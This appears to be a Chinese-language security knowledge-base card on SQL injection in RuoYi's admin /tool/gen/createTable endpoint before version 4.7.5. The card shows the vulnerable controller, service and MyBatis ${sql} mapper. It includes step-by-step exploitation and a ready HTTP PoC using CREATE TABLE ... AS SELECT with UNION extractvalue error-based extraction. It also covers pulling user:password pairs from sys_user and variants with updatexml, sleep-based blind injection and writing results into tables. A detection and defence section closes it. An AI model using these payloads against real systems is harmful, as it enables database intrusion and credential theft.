---
id: web-generic-sqli-ruoyi-gen-createtable-sql-execution
title: RuoYi <4.7.5 后台 /tool/gen/createTable 建表参数直入 MyBatis ${sql}：CREATE TABLE ... AS SELECT 叠 extractvalue 报错注入
type: scenario
domain: web
path: web/generic/sqli
technique: ruoyi-gen-createtable-mybatis-sqli
tags:
- java
- ruoyi
- mybatis
- sqli
- error-based
- code-audit
- admin
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: RuoYi < 4.7.5（原文标注；原文 PoC 截图报错路径为 v4.7.1）
verification:
  verified_by: verifier-V517
  verified_at: '2026-11-11T12:01:05+08:00'
  notes: 已对照原文与截图核对（v4.7.1 报错路径、XPATH syntax error '~5.7.28~'、sql=CREATE TABLE sss1 AS SELECT ... union SELECT extractvalue）；修正卡片错误推断：v4.7.1 控制器已用 SQLUtils.parseStatements+MySqlCreateTableStatement 限制语句类型（其余返回“请输入建表语句”），4.7.5 的修复是新增 SqlUtil.filterKeyword 关键字黑名单（含 select /update /and 等），原 PoC 在 4.7.5+ 被拒；据此改写原理第 4 点、步骤 4 与变体，删除“可任意 UPDATE/INSERT”说法。dedup：与 4.7.8 定时任务反射 createTable RCE 卡同  sink 但入口（HTTP 管理接口 vs 任务反射）、版本（<4.7.5 vs 4.7.8）、PoC 不同，保留。
url: /docs/web/generic/sqli/web-generic-sqli-ruoyi-gen-createtable-sql-execution/
draft: false
kb_aliases:
- RuoYi createTable SQL 注入
- 若依 /tool/gen/createTable 注入
- GenTableMapper createTable ${sql}
- RuoYi 代码生成建表注入
- createTable extractvalue 报错注入
---

## 一句话结论

RuoYi 4.7.5 之前，后台代码生成模块的 `/tool/gen/createTable` 把前端提交的 `sql` 参数经 Druid `SQLUtils` 解析为 `MySqlCreateTableStatement` 后，重新序列化交给 `GenTableServiceImpl#createTable`，最终落到 `GenTableMapper.xml` 的 `<update id="createTable">${sql}</update>` 字符串拼接执行；管理员提交 `CREATE TABLE sss1 AS SELECT ... UNION SELECT extractvalue(1,concat(0x7e,(select version()),0x7e))` 即可通过报错回显数据库版本/任意查询结果。

## 原理

- 控制器（`GenController#create`）：
  ```java
  @RequiresRoles("admin")
  @PostMapping("/createTable")
  public AjaxResult create(String sql) {
      List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);
      for (SQLStatement sqlStatement : sqlStatements) {
          if (sqlStatement instanceof MySqlCreateTableStatement) {
              ...
              int msg = genTableService.createTable(createTableStatement.toString());
  ```
  请求参数名就是 `sql`；4.7.1 的服务端用 Druid 的 `SQLUtils` 解析后只放行 `MySqlCreateTableStatement`（其它语句走 `else` 返回“请输入建表语句”），再把解析后重新序列化的语句文本交给 Service。
- 服务实现 `GenTableServiceImpl#createTable(String sql)`：
  ```java
  public boolean createTable(String sql) {
      return genTableMapper.createTable(sql) == 0;
  }
  ```
- Mapper  `GenTableMapper.xml`：
  ```xml
  <update id="createTable">
      ${sql}
  </update>
  ```
  `${}` 是 MyBatis 的字符串拼接（非 `#{}` 预编译），传进来的 DDL 文本会被数据库直接执行，等价于任意 SQL 执行入口。
- 修复边界：4.7.5 起控制器在解析前新增 `SqlUtil.filterKeyword(sql)`（黑名单含 `select `/`insert `/`update `/`drop `/`and `/`char ` 等关键字），原文 PoC 的 `SELECT ... union SELECT extractvalue` 会被直接拒绝；4.7.1 无此过滤，虽然代码只放行 `CREATE TABLE`，但 `CREATE TABLE ... AS SELECT` 的 SELECT 子句不受列/表达式限制，注入由此进入（原文 PoC 报错路径即 `v4.7.1`）。
- `CREATE TABLE ... AS SELECT` 本身是合法建表语句，其 SELECT 部分可带 `UNION SELECT extractvalue(...)`；`extractvalue` 的 XPath 解析错误会把子查询结果拼进异常信息，随接口 JSON 的 `msg` 字段回显（原文截图返回 `XPATH syntax error: '~5.7.28~'`）。

## 触发条件

- 目标为 RuoYi 4.7.5 之前的版本（原文标注；PoC 在 v4.7.1 环境验证）。
- 攻击者拥有 admin 角色（接口 `@RequiresRoles("admin")`）。
- 数据库为 MySQL（解析类型为 `DbType.mysql`，`extractvalue/updatexml` 为 MySQL 函数）。
- 应用把 SQL 异常信息返回给前端（RuoYi 默认 `AjaxResult` 会带 `msg`，报错注入依赖这一点）。

## 利用步骤

1. 以 admin 登录后台。
2. 向 `/tool/gen/createTable` POST 参数 `sql`，先用 `CREATE TABLE sss1 AS SELECT * FROM sys_job WHERE 1=1 UNION SELECT extractvalue(1,concat(0x7e,(select version()),0x7e));` 验证注入并回显版本。
3. 将 `select version()` 换成任意子查询（如 `select group_concat(user,0x3a,password) from sys_user`、`select @@datadir`）读取数据。
4. 该 HTTP 入口只放行 `CREATE TABLE` 语句，不能直接执行 `UPDATE`/`INSERT`；需要任意 SQL 时可改走定时任务反射调用服务层 `GenTableServiceImpl#createTable`（见 [[web-java-rce-ruoyi-478-createtable-sqli-job-invoketarget-bypass]]）。
5. 清理新建的临时表（如 `sss1`）。

## PoC

```http
POST /tool/gen/createTable HTTP/1.1
Host: 127.0.0.1:8088
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<admin会话>

sql=CREATE TABLE sss1 AS SELECT * FROM sys_job WHERE 1=1 union SELECT extractvalue(1,concat(0x7e,(select version()),0x7e));
```

```json
{"msg":"\n### Error updating database. Cause: java.sql.SQLException: XPATH syntax error: '~5.7.28~'\n### The error may exist in file .../GenTableMapper.xml\n### SQL: CREATE TABLE sss1 AS SELECT ...","code":500}
```

## 变体与关联

- 变体：`updatexml(1,concat(0x7e,(select ...),0x7e),1)` 同类报错回显；无回显时可走时间盲注（`sleep()`）或把查询结果写入新建表后经导出/列表页读取。
- 变体：把子查询结果经 `CREATE TABLE ... AS SELECT` 落进新表，再从代码生成的表列表/导出功能读取，适用于报错信息被屏蔽的环境。
- 关联：[[web-java-rce-ruoyi-478-createtable-sqli-job-invoketarget-bypass]]——同一 `GenTableMapper.createTable ${sql}` sink，那条链在 4.7.8 上通过定时任务反射调用 `GenTableServiceImpl.createTable` 执行 UPDATE 并绕过任务黑名单；本卡是 4.7.5 之前的直接 HTTP 管理接口入口与报错注入用法，入口、版本与 PoC 不同。
- 关联：[[web-generic-sqli-error-based-extraction]]——extractvalue/updatexml 报错注入通用手法。

## 检测与防御

- 检测：审计 `/tool/gen/createTable` 的 `sql` 参数，出现 `UNION`、`extractvalue`、`updatexml`、`sleep`、多语句分号等关键字即告警；监控 `GenTableMapper.createTable` 执行非建表 DDL/DML。
- 防御：`createTable` 改为预定义 DDL 模板 + 参数化，删除 `${sql}`；控制器进一步限制语句结构（只允许固定的建表字段/类型模板）。
- 防御：数据库账号最小权限，禁止应用账号执行非必要 DDL；SQL 异常信息不回显给前端。
- 防御：升级到 4.7.5+（原文标注的修复边界），并限制 admin 角色与代码生成模块的访问。
